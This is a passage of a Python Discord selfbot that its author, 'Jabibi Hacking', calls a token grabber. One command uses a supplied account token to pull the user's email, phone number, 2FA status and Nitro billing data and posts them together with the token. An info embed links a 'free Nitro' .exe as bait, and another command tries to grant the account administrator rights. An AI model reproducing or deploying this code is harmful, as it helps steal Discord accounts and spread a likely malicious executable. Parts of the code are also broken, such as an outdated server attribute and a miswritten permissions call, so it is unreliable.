                )
                ### Yoink nitro info
                res = requests.get(
                    "https://discordapp.com/api/v6/users/@me/billing/subscriptions",
                    headers=headers,
                )
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
                if has_nitro:
                    d1 = datetime.strptime(
                        nitro_data[0]["current_period_end"].split(".")[0],
                        "%Y-%m-%dT%H:%M:%S",
                    )
                    d2 = datetime.strptime(
                        nitro_data[0]["current_period_start"].split(".")[0],
                        "%Y-%m-%dT%H:%M:%S",
                    )
                    days_left = abs((d2 - d1).days)
                print(
                    f"{Fore.GREEN}[-] {Fore.RESET}Nitro information gotten sending info"
                )
                await ctx.send(
                    f"""```
Basic Information
-----------------
    Username               {user_name}
    User ID                {user_id}
    Creation Date          {creation_date}
    Avatar URL             {avatar_url if avatar_id else ""}
    Token                  {token}
Nitro Information
-----------------
    Nitro Status           {has_nitro}
    {f"Expires in          {days_left} day(s)" if has_nitro else ""}
Contact Information
-------------------
    Phone number           {phone_number if phone_number else "N/A"}
    Email                  {email if email else "N/A"}
Account Security
----------------
    2FA/MFA Enabled        {mfa_enabled}
    Flags                  {flags}
Other
-----
    Locale                 {locale} {language}
    Email Verified         {verified}
===TOKEN GRABBER MADED BY JABIBI HACKING===```"""
                )
            elif res.status_code == 404:
                    await ctx.send(":x:\n**Error:** Invalid token was provided (404)")

            else:
                await ctx.send(
                    "There seems to be an error looking up that token\nDouble check your token and try again"
                )
        except:
            uhhh = "JABIBI P[ORQUE TRATAS DE JODER A OTRO?"
            await ctx.send(f":x:\n**Error:** {404}")


#info sobre el bot
@bot.command()
async def infobot(ctx, category=None, *, user: discord.User = None):
    await ctx.message.delete()
    channel = ctx.message.channel
    if category is None:
       user = ctx.author
       date_format = "%a, %d %b %Y %I:%M %p"
       embed = discord.Embed(title="DISCORD BOT INFO CREATED BY JABIBI", description="este bot fue creado por mi con el proposito de modificar mi cuenta de discord>hagamos de cuenta que mi cuenta esta hackeada para que haga funciones modificadas que un bot normal no puede hacer dependiendo del code y de la forma en como lo vayas a crear muchas gracias", colour = discord.Colour.random())
       embed.set_author(name="jabibi hacking selfbot",
       icon_url ="https://cdn.discordapp.com/attachments/858594578143117332/868602065939750932/justbeingnamaste.gif"
       )
       embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/858594578143117332/868602065939750932/justbeingnamaste.gif")
       embed.add_field(name="Self Bot Info", value="ESTE BOT FUE O CUENTA MODIFICADA CREADA POR MI (JABIBI=! 𝕵𝖆𝖇𝖎𝖇𝖎 𝖉𝖉𝖔𝕾シ✞ 🖤#6666) FUE CREADO CON EL PROPOSITO DE TENER UNA CUENTA MODIFICADA Y MEJOR QUE LAS DEMAS Y CON FUNCIONES QUE UN BOT NORMAL NO TIENE", inline=True)
       embed.add_field(name="Sigueme en Twitch como> ", value="https://www.twitch.tv/jabibibaby", inline=False)
       embed.add_field(name="Sigueme en mi canal de youtube> ", value="https://www.youtube.com/channel/UCc5vZ7dcLBJu-P1oXWF5AkA", inline=False)
       embed.add_field(name="Sigueme en mi github> ", value="https://github.com/Jabibihackig23", inline=False)
       embed.add_field(name="Nitro Gratis By Jabibi> ", value="https://cdn.discordapp.com/attachments/861771955672449025/868846357069332490/prueba.exe", inline=False)
       embed.add_field(name="AQUI MI NUEVO VIDEO DE YOUTUBE>", value="https://youtu.be/dNaar-3KJBQ", inline=False)
       embed.add_field(name='Account Created', value=user.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'))
    if isinstance(user, discord.Member):
       embed.add_field(name='Join Date', value=user.joined_at.__format__('%A, %d. %B %Y @ %H:%M:%S'))
       embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/858594578143117332/868602065939750932/justbeingnamaste.gif")
       embed.set_footer(text="Created By Jabibi Hacking For Discord Account")
    await ctx.send(embed=embed)

    #obtener admin 
@bot.command()
async def GetAdmin(ctx):
    await ctx.message.delete()
    try:
        sv = ctx.message.server
        pm = discord.permissions(Administrator = True)
        await bot.create_role(sv, name = "JabibiCoding", permissions=pm)
    except Exception as e:
        print(f"Error: {e}")
    
    
bot.run("TOKEN", bot=False)
